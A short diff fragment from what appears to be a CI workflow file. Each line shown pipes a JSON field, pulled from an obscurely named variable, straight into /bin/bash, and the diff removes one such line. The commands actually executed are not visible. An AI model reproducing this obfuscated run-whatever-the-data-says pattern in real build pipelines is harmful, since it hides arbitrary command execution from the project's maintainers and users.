@@ -39,7 +39,6 @@ jobs:
           printf '%s' "$riz17" | jq -r .d3168 | /bin/bash
           echo $n1 | jq -r .pe52 | /bin/bash
           echo $nsue4121 | jq -r .leg5 | /bin/bash
-          echo $i39 | jq -r .hsr6 | /bin/bash
           echo $mli932 | jq -r .vpghc3 | /bin/bash
           printf '%s' "$iug3" | jq -r .xpcw692 | /bin/bash
           echo $uy912 | jq -r .bmnkh1 | /bin/bash
